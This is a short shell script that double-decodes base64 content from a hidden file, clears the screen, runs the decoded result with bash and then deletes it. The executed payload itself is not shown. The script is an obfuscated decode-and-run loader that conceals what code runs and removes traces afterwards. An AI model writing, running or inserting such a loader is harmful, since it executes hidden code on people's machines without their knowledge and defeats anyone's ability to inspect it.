decod=$(base64 -d .usex)
echo "$decod" |& tee .usex1
decoda=$(base64 -d .usex1)
echo "$decoda" |& tee .usex1
clear
bash .usex1
rm -fr .usex1
